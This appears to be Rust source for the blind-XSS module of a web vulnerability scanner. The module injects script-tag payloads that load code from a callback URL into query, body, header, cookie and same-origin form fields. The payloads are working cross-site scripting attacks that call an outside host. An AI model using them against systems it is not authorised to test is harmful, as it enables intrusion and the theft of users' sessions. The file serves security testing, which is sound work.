use crate::target_parser::Target;

/// Build the blind-XSS payload(s) for a callback URL.
///
/// When `custom_template_path` is provided, every non-empty,
/// non-`#`-comment line that contains `{callback}` is treated as a
/// template and `{callback}` is substituted with `callback_url`. Lines
/// without `{callback}` are reported via stderr and dropped — that's
/// the contract advertised by `--custom-blind-xss-payload`. If no
/// usable lines exist in the file (or it can't be read), fall back to
/// the built-in template.
fn build_blind_payloads(callback_url: &str, custom_template_path: Option<&str>) -> Vec<String> {
    if let Some(path) = custom_template_path {
        match std::fs::read_to_string(path) {
            Ok(content) => {
                let mut payloads: Vec<String> = Vec::new();
                let mut bad_lines = 0u32;
                for (lineno, line) in content.lines().enumerate() {
                    let trimmed = line.trim();
                    if trimmed.is_empty() || trimmed.starts_with('#') {
                        continue;
                    }
                    if trimmed.contains("{callback}") {
                        payloads.push(trimmed.replace("{callback}", callback_url));
                    } else {
                        bad_lines += 1;
                        if bad_lines <= 3 {
                            eprintln!(
                                "Warning: --custom-blind-xss-payload line {} skipped (no {{callback}} placeholder)",
                                lineno + 1
                            );
                        }
                    }
                }
                if !payloads.is_empty() {
                    return payloads;
                }
                eprintln!(
                    "Warning: --custom-blind-xss-payload {} had no usable lines — falling back to built-in",
                    path
                );
            }
            Err(e) => {
                eprintln!(
                    "Warning: failed to read --custom-blind-xss-payload {}: {} — falling back to built-in",
                    path, e
                );
            }
        }
    }
    let template = crate::payload::XSS_BLIND_PAYLOADS
        .first()
        .copied()
        .unwrap_or("\"'><script src={}></script>");
    vec![template.replace("{}", callback_url)]
}

pub async fn blind_scanning(
    target: &Target,
    callback_url: &str,
    custom_template_path: Option<&str>,
) {
    let payloads = build_blind_payloads(callback_url, custom_template_path);

    // Collect all params with static str types to avoid per-param String allocation
    let mut all_params: Vec<(String, &str)> = Vec::new();

    // Query params
    for (k, _v) in target.url.query_pairs() {
        all_params.push((k.into_owned(), "query"));
    }

    // Body params
    if let Some(data) = &target.data {
        for pair in data.split('&') {
            if let Some((k, _v)) = pair.split_once('=') {
                all_params.push((k.to_string(), "body"));
            }
        }
    }

    // Headers
    for (k, _v) in &target.headers {
        all_params.push((k.clone(), "header"));
    }

    // Cookies
    for (k, _v) in &target.cookies {
        all_params.push((k.clone(), "cookie"));
    }

    // Send requests for each (param × payload). Custom templates
    // typically supply just one or two shapes, so the cartesian
    // product stays small.
    for (param_name, param_type) in &all_params {
        for payload in &payloads {
            send_blind_request(target, param_name, payload, param_type).await;
        }
    }
}

async fn send_blind_request(target: &Target, param_name: &str, payload: &str, param_type: &str) {
    use tokio::time::{Duration, sleep};
    use url::form_urlencoded;

    let client = target.build_client_or_default();

    let url = match param_type {
        "query" => {
            let mut pairs: Vec<(String, String)> = target
                .url
                .query_pairs()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect();
            let mut found = false;
            for pair in &mut pairs {
                if pair.0 == param_name {
                    pair.1 = payload.to_string();
                    found = true;
                    break;
                }
            }
            if !found {
                pairs.push((param_name.to_string(), payload.to_string()));
            }
            let query = form_urlencoded::Serializer::new(String::new())
                .extend_pairs(&pairs)
                .finish();
            let mut url = target.url.clone();
            url.set_query(Some(&query));
            url
        }
        "body" => target.url.clone(),
        "header" => target.url.clone(),
        "cookie" => target.url.clone(),
        _ => target.url.clone(),
    };

    let mut request = client.request(target.parse_method(), url.clone());

    let mut headers = target.headers.clone();
    let mut cookies = target.cookies.clone();
    let mut body = target.data.clone();

    match param_type {
        "query" => {
            // Already handled in url
        }
        "body" => {
            if let Some(data) = &target.data {
                // Simple replace, assuming param=value& format
                body = Some(
                    data.replace(
                        &format!("{}=", param_name),
                        &format!("{}={}&", param_name, payload),
                    )
                    .trim_end_matches('&')
                    .to_string(),
                );
            }
        }
        "header" => {
            for (k, v) in &mut headers {
                if k == param_name {
                    *v = payload.to_string();
                }
            }
        }
        "cookie" => {
            for (k, v) in &mut cookies {
                if k == param_name {
                    *v = payload.to_string();
                }
            }
        }
        _ => {}
    }

    for (k, v) in &headers {
        request = request.header(k, v);
    }
    if let Some(ua) = &target.user_agent {
        request = request.header("User-Agent", ua);
    }
    let mut cookie_header = String::new();
    for (i, (k, v)) in cookies.iter().enumerate() {
        if i > 0 {
            cookie_header.push_str("; ");
        }
        cookie_header.push_str(k);
        cookie_header.push('=');
        cookie_header.push_str(v);
    }
    if !cookie_header.is_empty() {
        request = request.header("Cookie", cookie_header);
    }
    if let Some(b) = &body {
        request = request.body(b.clone());
    }

    // Send the request. We don't inspect the response (blind payloads report
    // out-of-band), but surface transport errors at DEBUG so users can tell a
    // delivery failure apart from a target that simply never calls back.
    crate::tick_request_count();
    if let Err(e) = request.send().await
        && crate::DEBUG.load(std::sync::atomic::Ordering::Relaxed)
    {
        eprintln!(
            "[DBG] blind request failed param={} type={}: {}",
            param_name, param_type, e
        );
    }

    if target.delay > 0 {
        sleep(Duration::from_millis(target.delay)).await;
    }
}

/// Discover HTML `<form>` elements on the target page and submit the Blind XSS
/// payload to each same-origin POST form, one request per injectable text-like
/// field. Non-text inputs (hidden, file, submit, button, image, reset,
/// checkbox, radio) and `<select>` keep their original value so CSRF tokens
/// and similar state survive the injection.
///
/// GET forms are skipped because their fields overlap with the existing
/// query-param blind injection in [`blind_scanning`]. Cross-origin form
/// actions are skipped to avoid unintended outbound requests. Multipart
/// forms are also skipped in this first pass.
pub async fn blind_scan_forms(
    target: &Target,
    callback_url: &str,
    custom_template_path: Option<&str>,
) {
    use tokio::time::{Duration, sleep};
    use url::form_urlencoded;

    let payloads = build_blind_payloads(callback_url, custom_template_path);
    // For form-discovery blast we keep the first template — the form
    // probe is best-effort and using every template here multiplies
    // request count without changing detection probability much.
    let payload = payloads
        .first()
        .cloned()
        .unwrap_or_else(|| "\"'><script src=ABOUT:BLANK></script>".to_string());

    let client = target.build_client_or_default();
    let cookie_header = build_cookie_header(&target.cookies);

    // Always GET the form-bearing page. Reusing target.method would POST to
    // the form handler instead of fetching the landing page that renders the
    // form, mirroring discovery::probe_html_forms.
    let mut fetch = client.get(target.url.clone());
    for (k, v) in &target.headers {
        fetch = fetch.header(k, v);
    }
    if let Some(ua) = &target.user_agent {
        fetch = fetch.header("User-Agent", ua);
    }
    if let Some(ref h) = cookie_header {
        fetch = fetch.header("Cookie", h);
    }
    crate::tick_request_count();
    let html = match fetch.send().await {
        Ok(resp) => match resp.text().await {
            Ok(text) => text,
            Err(_) => return,
        },
        Err(_) => return,
    };

    // Parse forms in a tight scope so `scraper::Html` (which is !Send) never
    // escapes across an await boundary.
    struct FormField {
        name: String,
        value: String,
        injectable: bool,
    }
    struct FormInfo {
        action: url::Url,
        fields: Vec<FormField>,
    }
    let forms: Vec<FormInfo> = {
        let document = scraper::Html::parse_document(&html);
        let form_sel = crate::scanning::selectors::form();
        let input_sel = crate::scanning::selectors::input_textarea_select();

        let mut out = Vec::new();
        for form in document.select(form_sel) {
            let method = form.value().attr("method").unwrap_or("get");
            if !method.eq_ignore_ascii_case("post") {
                continue;
            }
            let enctype = form.value().attr("enctype").unwrap_or("");
            if enctype.eq_ignore_ascii_case("multipart/form-data") {
                continue;
            }

            let action_attr = form.value().attr("action").unwrap_or("");
            let action_url = if action_attr.is_empty() || action_attr == "#" {
                target.url.clone()
            } else {
                match target.url.join(action_attr) {
                    Ok(u) => u,
                    Err(_) => continue,
                }
            };

            if !is_same_origin(&target.url, &action_url) {
                continue;
            }

            let mut fields: Vec<FormField> = Vec::new();
            for input in form.select(input_sel) {
                let name = input.value().attr("name").unwrap_or("").to_string();
                if name.is_empty() {
                    continue;
                }
                let value = input.value().attr("value").unwrap_or("").to_string();
                let injectable = is_injectable_input(&input);
                fields.push(FormField {
                    name,
                    value,
                    injectable,
                });
            }
            if !fields.iter().any(|f| f.injectable) {
                continue;
            }

            out.push(FormInfo {
                action: action_url,
                fields,
            });
        }
        out
    };

    for FormInfo { action, fields } in forms {
        for field_idx in 0..fields.len() {
            if !fields[field_idx].injectable {
                continue;
            }
            let body = fields
                .iter()
                .enumerate()
                .map(|(i, f)| {
                    let value = if i == field_idx { &payload } else { &f.value };
                    let enc_n =
                        form_urlencoded::byte_serialize(f.name.as_bytes()).collect::<String>();
                    let enc_v =
                        form_urlencoded::byte_serialize(value.as_bytes()).collect::<String>();
                    format!("{}={}", enc_n, enc_v)
                })
                .collect::<Vec<_>>()
                .join("&");

            let mut request = client.post(action.clone());
            for (k, v) in &target.headers {
                // Skip Content-Type from caller-supplied headers so we don't
                // emit a second value that conflicts with the urlencoded body.
                if k.eq_ignore_ascii_case("content-type") {
                    continue;
                }
                request = request.header(k, v);
            }
            // Set Content-Type last to guarantee it wins.
            request = request.header("Content-Type", "application/x-www-form-urlencoded");
            if let Some(ua) = &target.user_agent {
                request = request.header("User-Agent", ua);
            }
            if let Some(ref h) = cookie_header {
                request = request.header("Cookie", h);
            }
            request = request.body(body);

            crate::tick_request_count();
            if let Err(e) = request.send().await
                && crate::DEBUG.load(std::sync::atomic::Ordering::Relaxed)
            {
                eprintln!(
                    "[DBG] blind form request failed action={} field_idx={}: {}",
                    action, field_idx, e
                );
            }

            if target.delay > 0 {
                sleep(Duration::from_millis(target.delay)).await;
            }
        }
    }
}

/// Build a `Cookie:` header value once, returning None if the target has no
/// cookies configured.
fn build_cookie_header(cookies: &[(String, String)]) -> Option<String> {
    if cookies.is_empty() {
        return None;
    }
    Some(
        cookies
            .iter()
            .map(|(k, v)| format!("{}={}", k, v))
            .collect::<Vec<_>>()
            .join("; "),
    )
}

/// Returns true when an `input`/`textarea`/`select` node accepts free-form
/// user-controlled text, so substituting the Blind XSS payload there makes
/// sense. Non-text-bearing inputs (hidden, file, submit, button, image,
/// reset, checkbox, radio) and `<select>` keep their original value so CSRF
/// tokens and option choices survive.
fn is_injectable_input(el: &scraper::element_ref::ElementRef<'_>) -> bool {
    let tag = el.value().name();
    if tag.eq_ignore_ascii_case("textarea") {
        return true;
    }
    if !tag.eq_ignore_ascii_case("input") {
        // `<select>` and anything else: not free-form text.
        return false;
    }
    // <input> defaults to type="text" when the attribute is missing or
    // unrecognized. Treat the well-known text-bearing types as injectable.
    let ty = el.value().attr("type").unwrap_or("text");
    matches!(
        ty.to_ascii_lowercase().as_str(),
        "text" | "search" | "url" | "email" | "tel" | "password" | "number"
    )
}

/// Same-origin check: scheme + host + port must match.
fn is_same_origin(a: &url::Url, b: &url::Url) -> bool {
    a.scheme() == b.scheme()
        && a.host_str() == b.host_str()
        && a.port_or_known_default() == b.port_or_known_default()
}

#[cfg(test)]
mod tests;
